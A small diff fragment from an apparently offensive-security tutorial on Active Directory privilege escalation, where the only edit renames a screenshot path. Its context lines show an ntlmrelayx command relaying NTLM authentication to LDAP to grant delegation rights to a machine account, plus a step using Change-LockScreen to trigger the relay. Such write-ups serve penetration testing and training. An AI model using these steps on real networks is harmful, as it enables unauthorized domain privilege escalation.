@@ -94,7 +94,7 @@ We now have all our prerequisites. Time to escalate our privileges.
 python3 /opt/impacket/examples/ntlmrelayx.py -t ldap://10.0.0.3 --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg
 ```
 
-![](<../../../../.gitbook/assets/image (34) (1) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (34) (1) (1) (1) (1) (1).png>)
 
 5\. Run the Change-LockScreen tool in the shell of WS01 and check the ntlmrelay output. The Change-LockScreen command will give an error but this doesn't matter:
 
